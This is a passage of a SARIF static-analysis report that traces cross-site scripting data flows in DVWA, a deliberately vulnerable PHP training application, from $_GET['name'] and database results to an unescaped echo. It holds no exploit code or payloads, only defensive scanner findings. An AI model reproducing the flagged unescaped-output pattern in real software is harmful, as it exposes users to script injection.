              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4712",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E589ACA40A8E29327313F6B7E0C96E5F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:8 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4715",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "E92ADFA22895E54D8A5C1B6A0234C9DF"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:20 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:20 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:15 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 15
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:19 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 19
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:20 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:24 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
